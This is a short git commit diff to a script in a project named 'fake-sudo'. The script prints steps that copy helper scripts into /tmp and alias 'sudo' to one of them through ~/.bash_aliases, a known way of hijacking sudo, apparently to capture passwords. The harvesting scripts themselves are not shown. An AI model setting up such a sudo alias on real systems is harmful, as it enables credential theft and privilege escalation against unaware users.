14977c73037406c52cf5c2a1b861de0901c265fe
Jidnyesh <jidnyeshjawanjal29@gmail.com>
2023-04-08 23:16:18 -0400

    update

--- fake-sudo/main.sh
+++ fake-sudo/main.sh
@@ -1,8 +1,8 @@
+echo "chmod +x sudo.sh"
 echo "cp sudo.sh /tmp/sudo.sh"
-echo "chmod +x /tmp/sudo.sh"
 
+echo "chmod +x sudo.py"
 echo "cp sudo.py /tmp/sudo.py"
-echo "chmod +x /tmp/sudo.py"
 
 
 echo "alias sudo='/tmp/sudo.sh' >> ~/.bash_aliases"
